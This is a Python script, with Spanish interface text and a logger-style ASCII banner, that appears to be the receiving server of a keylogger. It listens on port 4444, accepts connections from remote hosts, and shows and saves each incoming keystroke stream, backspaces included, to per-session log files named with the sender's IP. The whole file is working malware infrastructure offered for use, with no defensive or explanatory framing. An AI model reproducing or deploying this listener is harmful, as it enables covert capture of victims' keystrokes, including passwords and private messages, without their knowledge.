import socket
import time
import threading
import sys
from datetime import datetime
import os

print("""
    ___                        _ __                       
   /   |  ____ ___  ___  _____(_) /___  ____ _____ ____  _____
  / /| | / __ `__ \/ _ \/ ___/ / / __ \/ __ `/ __ `/ _ \/ ___/
 / ___ |/ / / / / /  __/ /  / / / /_/ / /_/ / /_/ /  __/ /    
/_/  |_/_/ /_/ /_/\___/_/  /_/_/\____/\__, /\__, /\___/_/     
                                     /____//____/              
""")

if not os.path.exists('logs'):
    os.makedirs('logs')

def mostrar_desconexion():
    msg = """
############################################################

                    Conexion terminada

############################################################
"""
    
    for i in range(3):
        os.system('cls' if sys.platform == 'win32' else 'clear')
        
        print(msg)
        time.sleep(0.4)
        
        os.system('cls' if sys.platform == 'win32' else 'clear')
        time.sleep(0.3)
    
    os.system('cls' if sys.platform == 'win32' else 'clear')
    print(msg)
    time.sleep(2)

def srv():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444))
    s.listen(5)
    
    num = 1
    
    while True:
        try:
            wait = True
            
            def blink():
                p = 0
                while wait:
                    txt = 'Esperando' + '.' * p
                    spc = ' ' * ((60 - len(txt)) // 2)
                    sys.stdout.write('\r' + ' ' * 70)
                    sys.stdout.write('\r' + spc + txt)
                    sys.stdout.flush()
                    p = (p + 1) % 4
                    time.sleep(0.5)
            
            t = threading.Thread(target=blink, daemon=True)
            t.start()
            
            conn, addr = s.accept()
            wait = False
            time.sleep(0.6)
            sys.stdout.write('\r' + ' ' * 70 + '\r')
            sys.stdout.flush()
            
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            print(f"\n{'='*60}")
            print(f"SESION #{num}")
            print(f"{addr[0]}:{addr[1]}")
            print(f"{now}")
            print(f"{'='*60}\n")
            
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            log = f"logs/s{num}_{ts}_{addr[0]}.txt"
            
            with open(log, 'w', encoding='utf-8') as f:
                f.write(f"=== SESION #{num} ===\n")
                f.write(f"IP: {addr[0]}:{addr[1]}\n")
                f.write(f"Inicio: {now}\n")
                f.write(f"{'='*60}\n\n")
                
                while True:
                    try:
                        data = conn.recv(1024)
                        if not data:
                            break
                        
                        try:
                            txt = data.decode('utf-8', errors='ignore')
                            
                            for c in txt:
                                if c == '\b':
                                    sys.stdout.write('\b \b')
                                    f.write('[BACK]')
                                else:
                                    sys.stdout.write(c)
                                    f.write(c)
                            
                            sys.stdout.flush()
                            f.flush()
                        except:
                            pass
                    except:
                        break
                
                end = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n\n{'='*60}\n")
                f.write(f"Fin: {end}\n")
            
            conn.close()
            
            mostrar_desconexion()
            
            os.system('cls' if sys.platform == 'win32' else 'clear')
            print(f"\n{'='*60}")
            print(f"SESION #{num} Terminada")
            print(f"{end}")
            print(f"Log: {log}")
            print(f"{'='*60}\n")
            
            num += 1
            
            time.sleep(2)
            os.system('cls' if sys.platform == 'win32' else 'clear')
            
            print("""
    ___                        _ __                       
   /   |  ____ ___  ___  _____(_) /___  ____ _____ ____  _____
  / /| | / __ `__ \/ _ \/ ___/ / / __ \/ __ `/ __ `/ _ \/ ___/
 / ___ |/ / / / / /  __/ /  / / / /_/ / /_/ / /_/ /  __/ /    
/_/  |_/_/ /_/ /_/\___/_/  /_/_/\____/\__, /\__, /\___/_/     
                                     /____//____/              
            """)
            
        except KeyboardInterrupt:
            print("\n\nDetenido")
            break
        except Exception as e:
            print(f"\nError: {e}")
            time.sleep(2)
    
    s.close()

try:
    srv()
except Exception as e:
    print(f"Error: {e}")